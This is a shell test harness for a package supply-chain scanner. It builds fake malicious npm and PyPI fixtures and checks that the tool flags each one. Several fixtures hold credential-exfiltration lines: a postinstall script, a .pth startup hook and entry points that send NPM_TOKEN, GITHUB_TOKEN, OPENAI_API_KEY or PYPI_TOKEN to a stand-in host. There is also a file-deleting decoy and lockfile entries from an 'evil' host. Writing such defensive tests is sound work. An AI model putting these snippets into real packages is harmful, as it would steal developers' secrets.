#!/bin/sh
set -eu

ROOT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
CLI="$ROOT_DIR/whoathere/target/debug/whoathere"
WORK_DIR="${TMPDIR:-/tmp}/whoathere-real-world-attack-harness.$$"
STATE_DIR="$WORK_DIR/state"

cleanup() {
  rm -rf "$WORK_DIR"
}
trap cleanup EXIT INT TERM

require_contains() {
  needle=$1
  file=$2
  label=$3
  if ! grep -Fq "$needle" "$file"; then
    echo "missing_${label}: $needle" >&2
    cat "$file" >&2
    exit 1
  fi
}

require_not_contains() {
  needle=$1
  file=$2
  label=$3
  if grep -Fq "$needle" "$file"; then
    echo "forbidden_${label}: $needle" >&2
    cat "$file" >&2
    exit 1
  fi
}

run_capture() {
  expected=$1
  output=$2
  shift 2
  set +e
  "$@" >"$output" 2>&1
  status=$?
  set -e
  if [ "$status" -ne "$expected" ]; then
    echo "unexpected_exit expected=$expected actual=$status command=$*" >&2
    cat "$output" >&2
    exit 1
  fi
}

make_pyproject() {
  dir=$1
  name=$2
  mkdir -p "$dir/$name"
  cat >"$dir/pyproject.toml" <<PY
[project]
name = "$name"
version = "1.0.0"
whoathere-published-at = 1700000000
PY
}

cargo build --manifest-path "$ROOT_DIR/whoathere/Cargo.toml" -p whoathere-cli --bin whoathere >/dev/null
mkdir -p "$WORK_DIR"

NPM_COMPROMISED="$WORK_DIR/npm-compromised"
mkdir -p "$NPM_COMPROMISED"
cat >"$NPM_COMPROMISED/package.json" <<'JSON'
{"name":"npm-compromised-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"scripts":{"postinstall":"node postinstall.js"},"dependencies":{"tiny-second-stage":"1.0.0"},"repository":"https://example.invalid/repo"}
JSON
cat >"$NPM_COMPROMISED/postinstall.js" <<'JS'
fetch("https://example.invalid/collect?canary=" + process.env.NPM_TOKEN)
JS
run_capture 22 "$WORK_DIR/npm-compromised.json" "$CLI" package-risk assess --workspace "$NPM_COMPROMISED" --ecosystem npm --state-dir "$STATE_DIR" --json
require_contains 'npm_lifecycle_script_postinstall' "$WORK_DIR/npm-compromised.json" npm_postinstall
require_contains 'network_capability_observed' "$WORK_DIR/npm-compromised.json" npm_network

NPM_DECOY="$WORK_DIR/npm-decoy"
mkdir -p "$NPM_DECOY"
cat >"$NPM_DECOY/package.json" <<'JSON'
{"name":"npm-decoy-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"scripts":{"prepare":"node decoy.js"},"repository":"https://example.invalid/repo"}
JSON
cat >"$NPM_DECOY/decoy.js" <<'JS'
require("fs").unlinkSync("package.json")
JS
run_capture 22 "$WORK_DIR/npm-decoy.json" "$CLI" package-risk assess --workspace "$NPM_DECOY" --ecosystem npm --state-dir "$STATE_DIR" --json
require_contains 'npm_lifecycle_script_prepare' "$WORK_DIR/npm-decoy.json" npm_prepare

NPM_API_COMPAT="$WORK_DIR/npm-api-compatible"
mkdir -p "$NPM_API_COMPAT"
cat >"$NPM_API_COMPAT/package.json" <<'JSON'
{"name":"npm-api-compatible-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"main":"index.js"}
JSON
cat >"$NPM_API_COMPAT/index.js" <<'JS'
class Client {
  list() {
    return fetch("https://example.invalid/collect?token=" + process.env.OPENAI_API_KEY);
  }
}
module.exports = { Client };
JS
run_capture 22 "$WORK_DIR/npm-api-compatible.json" "$CLI" package-risk assess --workspace "$NPM_API_COMPAT" --ecosystem npm --state-dir "$STATE_DIR" --json
require_contains 'credential_or_environment_access' "$WORK_DIR/npm-api-compatible.json" npm_api_secret
require_contains 'network_capability_observed' "$WORK_DIR/npm-api-compatible.json" npm_api_network

NPM_BIN_ENTRY="$WORK_DIR/npm-bin-entry"
mkdir -p "$NPM_BIN_ENTRY"
cat >"$NPM_BIN_ENTRY/package.json" <<'JSON'
{"name":"npm-bin-entry-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"bin":{"npm-bin-entry-fixture":"cli.js"}}
JSON
cat >"$NPM_BIN_ENTRY/cli.js" <<'JS'
fetch("https://example.invalid/collect?token=" + process.env.GITHUB_TOKEN)
JS
run_capture 22 "$WORK_DIR/npm-bin-entry.json" "$CLI" package-risk assess --workspace "$NPM_BIN_ENTRY" --ecosystem npm --state-dir "$STATE_DIR" --json
require_contains 'npm_bin_entry_declared' "$WORK_DIR/npm-bin-entry.json" npm_bin_indicator
require_contains 'npm_bin_entry_requires_manual_review' "$WORK_DIR/npm-bin-entry.json" npm_bin_review
require_contains 'credential_or_environment_access' "$WORK_DIR/npm-bin-entry.json" npm_bin_secret
require_contains 'network_capability_observed' "$WORK_DIR/npm-bin-entry.json" npm_bin_network

NPM_CI_DELAY="$WORK_DIR/npm-ci-delay"
mkdir -p "$NPM_CI_DELAY"
cat >"$NPM_CI_DELAY/package.json" <<'JSON'
{"name":"npm-ci-delay-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"main":"index.js"}
JSON
cat >"$NPM_CI_DELAY/index.js" <<'JS'
if (process.env.CI === "true") {
  require("child_process").exec("echo delayed");
}
JS
run_capture 22 "$WORK_DIR/npm-ci-delay.json" "$CLI" package-risk assess --workspace "$NPM_CI_DELAY" --ecosystem npm --state-dir "$STATE_DIR" --json
require_contains 'delayed_ci_activation_marker' "$WORK_DIR/npm-ci-delay.json" npm_ci_marker
require_contains 'process_spawn_capability_observed' "$WORK_DIR/npm-ci-delay.json" npm_ci_spawn

NPM_MACOS_ONLY="$WORK_DIR/npm-macos-only"
mkdir -p "$NPM_MACOS_ONLY"
cat >"$NPM_MACOS_ONLY/package.json" <<'JSON'
{"name":"npm-macos-only-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"main":"darwin_payload.js"}
JSON
cat >"$NPM_MACOS_ONLY/darwin_payload.js" <<'JS'
if (process.platform === "darwin") {
  module.exports = "activated";
}
JS
run_capture 22 "$WORK_DIR/npm-macos-only.json" "$CLI" package-risk assess --workspace "$NPM_MACOS_ONLY" --ecosystem npm --state-dir "$STATE_DIR" --json
require_contains 'platform_specific_macos_marker' "$WORK_DIR/npm-macos-only.json" npm_macos_marker

NPM_NATIVE="$WORK_DIR/npm-native"
mkdir -p "$NPM_NATIVE"
cat >"$NPM_NATIVE/package.json" <<'JSON'
{"name":"npm-native-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"gypfile":true}
JSON
touch "$NPM_NATIVE/binding.gyp"
touch "$NPM_NATIVE/addon.node"
run_capture 22 "$WORK_DIR/npm-native.json" "$CLI" package-risk assess --workspace "$NPM_NATIVE" --ecosystem npm --state-dir "$STATE_DIR" --json
require_contains 'native_extension_marker' "$WORK_DIR/npm-native.json" npm_native_marker
require_contains 'native_or_binary_payload_marker' "$WORK_DIR/npm-native.json" npm_binary_marker
require_contains 'native_extension_requires_manual_review' "$WORK_DIR/npm-native.json" npm_native_review

NPM_TRANSITIVE_LOCKFILE="$WORK_DIR/npm-transitive-lockfile"
mkdir -p "$NPM_TRANSITIVE_LOCKFILE"
cat >"$NPM_TRANSITIVE_LOCKFILE/package.json" <<'JSON'
{"name":"npm-transitive-lockfile-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"private":true}
JSON
cat >"$NPM_TRANSITIVE_LOCKFILE/package-lock.json" <<'JSON'
{
  "name": "npm-transitive-lockfile-fixture",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "npm-transitive-lockfile-fixture",
      "version": "1.0.0"
    },
    "node_modules/tiny-second-stage": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/tiny-second-stage/-/tiny-second-stage-1.0.0.tgz",
      "integrity": "sha512-clean"
    },
    "node_modules/transitive-evil": {
      "version": "9.9.9",
      "resolved": "https://evil.example.invalid/transitive-evil-9.9.9.tgz",
      "integrity": "sha512-evil"
    }
  }
}
JSON
run_capture 20 "$WORK_DIR/npm-transitive-lockfile.json" "$CLI" package-risk assess --workspace "$NPM_TRANSITIVE_LOCKFILE" --ecosystem npm --state-dir "$STATE_DIR" --json
require_contains '"package_name": "tiny-second-stage"' "$WORK_DIR/npm-transitive-lockfile.json" npm_lockfile_registry_subject
require_contains '"package_name": "transitive-evil"' "$WORK_DIR/npm-transitive-lockfile.json" npm_lockfile_direct_subject
require_contains 'npm_lockfile_dependency_record' "$WORK_DIR/npm-transitive-lockfile.json" npm_lockfile_dependency
require_contains 'dependency_source_direct_url' "$WORK_DIR/npm-transitive-lockfile.json" npm_lockfile_direct
require_contains 'direct_vcs_editable_denied_by_default' "$WORK_DIR/npm-transitive-lockfile.json" npm_lockfile_denied

PTH="$WORK_DIR/python-pth"
make_pyproject "$PTH" "python_pth_fixture"
cat >"$PTH/sitecustomize.pth" <<'PY'
import os, urllib.request; urllib.request.urlopen("https://example.invalid/?t=" + os.environ.get("PYPI_TOKEN", ""))
PY
run_capture 22 "$WORK_DIR/python-pth.json" "$CLI" package-risk assess --workspace "$PTH" --ecosystem pypi --state-dir "$STATE_DIR" --json
require_contains 'python_pth_startup_hook' "$WORK_DIR/python-pth.json" pth_hook
require_contains 'credential_or_environment_access' "$WORK_DIR/python-pth.json" pth_secret

IMPORT_TIME="$WORK_DIR/python-import-time"
make_pyproject "$IMPORT_TIME" "python_import_time_fixture"
cat >"$IMPORT_TIME/python_import_time_fixture/__init__.py" <<'PY'
import os
import socket
TOKEN = os.environ.get("GITHUB_TOKEN", "")
socket.getaddrinfo("example.invalid", 443)
PY
run_capture 22 "$WORK_DIR/python-import-time.json" "$CLI" package-risk assess --workspace "$IMPORT_TIME" --ecosystem pypi --state-dir "$STATE_DIR" --json
require_contains 'credential_or_environment_access' "$WORK_DIR/python-import-time.json" import_secret
require_contains 'network_capability_observed' "$WORK_DIR/python-import-time.json" import_network

API_COMPAT="$WORK_DIR/python-api-compatible"
make_pyproject "$API_COMPAT" "python_api_compatible"
cat >"$API_COMPAT/python_api_compatible/__init__.py" <<'PY'
class Client:
    def __init__(self):
        import os
        self.token = os.environ.get("OPENAI_API_KEY", "")
    def list(self):
        return []
PY
run_capture 22 "$WORK_DIR/python-api-compatible.json" "$CLI" package-risk assess --workspace "$API_COMPAT" --ecosystem pypi --state-dir "$STATE_DIR" --json
require_contains 'credential_or_environment_access' "$WORK_DIR/python-api-compatible.json" api_secret

PYTHON_ENTRYPOINT="$WORK_DIR/python-entrypoint"
make_pyproject "$PYTHON_ENTRYPOINT" "python_entrypoint"
cat >>"$PYTHON_ENTRYPOINT/pyproject.toml" <<'PY'

[project.scripts]
python-entrypoint = "python_entrypoint:main"
PY
cat >"$PYTHON_ENTRYPOINT/python_entrypoint/__init__.py" <<'PY'
def main():
    import os
    import urllib.request
    return urllib.request.urlopen("https://example.invalid/?t=" + os.environ.get("GITHUB_TOKEN", ""))
PY
run_capture 22 "$WORK_DIR/python-entrypoint.json" "$CLI" package-risk assess --workspace "$PYTHON_ENTRYPOINT" --ecosystem pypi --state-dir "$STATE_DIR" --json
require_contains 'python_console_script_entry_declared' "$WORK_DIR/python-entrypoint.json" python_entrypoint_indicator
require_contains 'python_entry_point_requires_manual_review' "$WORK_DIR/python-entrypoint.json" python_entrypoint_review
require_contains 'credential_or_environment_access' "$WORK_DIR/python-entrypoint.json" python_entrypoint_secret
require_contains 'network_capability_observed' "$WORK_DIR/python-entrypoint.json" python_entrypoint_network

MACOS_ONLY="$WORK_DIR/python-macos-only"
make_pyproject "$MACOS_ONLY" "python_macos_only"
cat >"$MACOS_ONLY/python_macos_only/darwin_payload.py" <<'PY'
import platform
if platform.system() == "Darwin":
    pass
PY
run_capture 22 "$WORK_DIR/python-macos-only.json" "$CLI" package-risk assess --workspace "$MACOS_ONLY" --ecosystem pypi --state-dir "$STATE_DIR" --json
require_contains 'platform_specific_macos_marker' "$WORK_DIR/python-macos-only.json" macos_marker

CI_DELAY="$WORK_DIR/python-ci-delay"
make_pyproject "$CI_DELAY" "python_ci_delay"
cat >"$CI_DELAY/python_ci_delay/__init__.py" <<'PY'
import os
if os.environ.get("CI") == "true":
    pass
PY
run_capture 22 "$WORK_DIR/python-ci-delay.json" "$CLI" package-risk assess --workspace "$CI_DELAY" --ecosystem pypi --state-dir "$STATE_DIR" --json
require_contains 'delayed_ci_activation_marker' "$WORK_DIR/python-ci-delay.json" ci_marker

BINARY="$WORK_DIR/python-binary"
make_pyproject "$BINARY" "python_binary"
touch "$BINARY/python_binary/native.so"
run_capture 22 "$WORK_DIR/python-binary.json" "$CLI" package-risk assess --workspace "$BINARY" --ecosystem pypi --state-dir "$STATE_DIR" --json
require_contains 'native_or_binary_payload_marker' "$WORK_DIR/python-binary.json" binary_marker
require_contains 'native_extension_requires_manual_review' "$WORK_DIR/python-binary.json" native_review

DIRECT="$WORK_DIR/python-direct"
mkdir -p "$DIRECT"
cat >"$DIRECT/requirements.txt" <<'REQ'
evil @ git+https://example.invalid/evil.git
-e https://example.invalid/editable.git
REQ
run_capture 20 "$WORK_DIR/python-direct.json" "$CLI" package-risk assess --workspace "$DIRECT" --ecosystem pypi --state-dir "$STATE_DIR" --json
require_contains 'direct_vcs_editable_denied_by_default' "$WORK_DIR/python-direct.json" direct_deny

SCANNER_WS="$WORK_DIR/scanner-workspace"
mkdir -p "$SCANNER_WS"
cat >"$SCANNER_WS/package.json" <<'JSON'
{"name":"scanner-fixture","version":"1.0.0"}
JSON
OUTAGE_CACHE="$WORK_DIR/scanner-outage-cache/.whoathere/scanners/bin"
mkdir -p "$OUTAGE_CACHE"
for scanner in guarddog osv-scanner syft grype pip-audit; do
  cat >"$OUTAGE_CACHE/$scanner" <<'SH'
#!/bin/sh
echo "simulated scanner outage" >&2
exit 127
SH
  chmod +x "$OUTAGE_CACHE/$scanner"
done
(
  run_capture 20 "$WORK_DIR/scanner-outage.json" env WHOATHERE_SCANNER_CACHE_DIR="$WORK_DIR/scanner-outage-cache/.whoathere/scanners" PATH=/usr/bin "$CLI" scanners run --workspace "$SCANNER_WS" --ecosystem npm --timeout-seconds 1 --execute --json
)
require_contains 'scanner_process_error' "$WORK_DIR/scanner-outage.json" scanner_outage

FAKE_CACHE="$WORK_DIR/timeout-cache/.whoathere/scanners/bin"
mkdir -p "$FAKE_CACHE"
for scanner in guarddog osv-scanner syft grype pip-audit; do
  cat >"$FAKE_CACHE/$scanner" <<'SH'
#!/bin/sh
/bin/sleep 5
exit 0
SH
  chmod +x "$FAKE_CACHE/$scanner"
done
(
  run_capture 20 "$WORK_DIR/scanner-timeout.json" env WHOATHERE_SCANNER_CACHE_DIR="$WORK_DIR/timeout-cache/.whoathere/scanners" PATH=/usr/bin "$CLI" scanners run --workspace "$SCANNER_WS" --ecosystem npm --timeout-seconds 1 --execute --json
)
require_contains 'scanner_process_timed_out' "$WORK_DIR/scanner-timeout.json" scanner_timeout

for file in "$WORK_DIR"/*.json; do
  require_not_contains 'WHOATHERE_CANARY_TOKEN_VALUE' "$file" raw_canary
  require_not_contains 'real_npm_token' "$file" raw_token
  require_not_contains '/Users/' "$file" host_path
done

echo "real_world_attack_harness=ok"
